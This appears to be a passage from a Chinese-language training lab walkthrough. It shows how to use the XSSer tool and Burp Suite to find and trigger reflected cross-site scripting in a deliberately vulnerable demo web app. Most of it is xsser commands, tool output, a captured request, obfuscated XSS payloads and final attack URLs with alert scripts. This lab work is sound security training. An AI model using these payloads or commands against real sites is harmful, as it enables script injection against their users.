第 12 步：将 URL 传递给 XSSer!。将“HelloWorld”替换为“XSS”，这样做是为了让 XSSer 可以用有效负载替换“XSS”字符串。

命令

```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

输出确认目标易受攻击。

```
root@INE:~# xsser --url "http://demo.ine.local/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"
===========================================================================

XSSer v1.8[4]: "The HiV€!" - (https://xsser.03c8.net) - 2010/2021 -> by psy

===========================================================================
Testing [XSS from URL]...
===========================================================================
===========================================================================
[*] Test: [ 1/1 ] <-> 2022-06-30 19:03:06.288380
===========================================================================

[+] Target: 

 [ http://demo.ine.local/index.php?page=dns-lookup.php ]

---------------------------------------------

[!] Hashing: 

 [ 0cc305adb7da682e46f2f8c6ea2bceeb ] : [ target_host ]

---------------------------------------------

[*] Trying: 

http://demo.ine.local/index.php?page=dns-lookup.php (POST: target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS)

---------------------------------------------

[+] Vulnerable(s): 

 [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]

---------------------------------------------

=============================================
[*] Injection(s) Results:
=============================================

 [FOUND !!!] -> [ 0cc305adb7da682e46f2f8c6ea2bceeb ] : [ target_host ]

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=dns-lookup.php | target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS
[+] Vector: [ target_host ]
[!] Method: URL
[*] Hash: 0cc305adb7da682e46f2f8c6ea2bceeb
[*] Payload: target_host=%22%3E0cc305adb7da682e46f2f8c6ea2bceeb&dns-lookup-php-submit-button=Lookup+DNS
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 

```

第 13 步：使用 XSSer 的“--auto”选项尝试各种 XSS 有效负载。

```
*选择向量*：
    这些选项可用于指定注入代码。如果您不想注入默认使用的通用 XSS 向量，这很重要。仅选择一个选项：
    --payload=SCRIPT OWN - 注入你自己的代码
    --auto AUTO - 注入 XSSer 提供的向量列表
```

命令

```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
```

```
POST /index.php?page=dns-lookup.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)
Accept: */*
Referer: 127.0.0.1
Content-Length: 172
Content-Type: application/x-www-form-urlencoded

target_host=X%3Cx+style%3D%60behavior%3Aurl%28%23Zault%23time2%29%60+onbegin%3D%60write%2856cae530e8657c37bd00c736ae8a92c0%29%60+%3E&dns-lookup-php-submit-button=Lookup+DNSHTTP/1.1 200 OK
Date: Thu, 30 Jun 2022 13:41:29 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Set-Cookie: PHPSESSID=824d6jnicgj1vtms0o2omdlf36; path=/
Set-Cookie: showhints=1
Logged-In-User: 
X-XSS-Protection: 0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
```

从Wireshark捕获的数据包中，可以看到`target_host`参数的值尝试了很多payloads。

```
X<x+style=`behavior:url(#Zault#time2)`+onbegin=`write(56cae530e8657c37bd00c736ae8a92c0)`+>
<xmp>+<%25+</xmp>+<img+alt='%25></xmp><img+src=xx:x+onerror=alert(0bc574c7eeb2316f80423b2be1201cc3)//'>++<script>+x='<%25'+</script>+%25>/+alert(0bc574c7eeb2316f80423b2be1201cc3)+</script>++XXX+<style>+*['<!--']{}+</style>+-->{}+*{color:red}</style>
```

```
=============================================
[*] Injection(s) Results:
=============================================

 [FOUND !!!] -> [ 7d25fd174deffd52931cbca9a3bdb030 ] : [ target_host ]

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1291
- Failed: 4
- Successful: 1287
- Accur: 99.69016266460109 %

===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1287 ] possible XSS vectors! ;-)

```
XXSer 尝试了 1291 次注射，成功率99.69%。

第 14 步：使用自定义 XSS 有效负载

```
*选择最终注射*：
    这些选项可用于指定要在易受攻击的目标上注入的最终代码。如果您想“疯狂地”利用发现的漏洞，这一点很重要。仅选择一个选项：
    --Fp=FINALPAYLOAD OWN - 利用你自己的代码
    --Fr=FINALREMOTE REMOTE - 利用脚本 -remotely-
```

命令

```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```

生成编码的 XSS 有效负载。

```
===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=dns-lookup.php | target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS
[+] Vector: [ target_host ]
[!] Method: URL
[*] Hash: 9830427ce15fd0e2b683b333f34e5427
[*] Payload: target_host=%22%3E9830427ce15fd0e2b683b333f34e5427&dns-lookup-php-submit-button=Lookup+DNS
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[*] Final Attack: target_host=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 

```

第 15 步：在 Burp Suite 中，将 POST 参数替换为最终的攻击载荷并转发请求。

有效载荷

```
target_host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS
```


切换到firefox浏览器观察结果

XSS 有效负载被触发。

第 16 步：关闭 Burp Suite “拦截”

针对 GET 请求的 XSS 攻击
第 17 步：让我们对 GET 请求执行 XSS 攻击。导航到跨站点脚本 (XSS) > Reflected (First Order) > Poll Question网页。

网址

```
http://demo.ine.local/index.php?page=user-poll.php
```

第 18 步：选择任何“nmap”选项（按单选按钮），在您的姓名缩写文本字段中填写“d”并提交投票。

值“nmap”反映在网页上。

第 19 步：复制 URL，将“nmap”值替换为“XSS”并将其传递给 XSSer。

网址

```
http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=d&user-poll-php-submit-button=Submit+Vote
```
命令

```
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote"
```

```
===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote
[+] Vector: [ choice ]
[!] Method: URL
[*] Hash: f925bf33e2f169a73511f112c4b9670a
[*] Payload: http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=%22%3Ef925bf33e2f169a73511f112c4b9670a&initials=d&user-poll-php-submit-button=Submit+Vote
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 
```
输出确认目标易受攻击。

第 20 步：向 XSSer 提供基本的 XSS 有效负载。

命令

```
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```

```
===========================================================================
[*] List of XSS injections:
===========================================================================

-> CONGRATULATIONS: You have found: [ 1 ] possible XSS vector! ;-)

---------------------

[+] Target: http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote
[+] Vector: [ choice ]
[!] Method: URL
[*] Hash: 31b2f1af773352c09af684b128d226b0
[*] Payload: http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=%22%3E31b2f1af773352c09af684b128d226b0&initials=d&user-poll-php-submit-button=Submit+Vote
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[*] Final Attack: http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&initials=d&user-poll-php-submit-button=Submit+Vote
[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!] 
 -------------------------------------------------- 

```

第21步：打开Final Attack链接，在火狐浏览器中触发XSS漏洞。

网址

```
http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&initials=d&user-poll-php-submit-button=Submit+Vote
```

这就是我们可以使用 XSSer 执行 XSS 攻击的方式！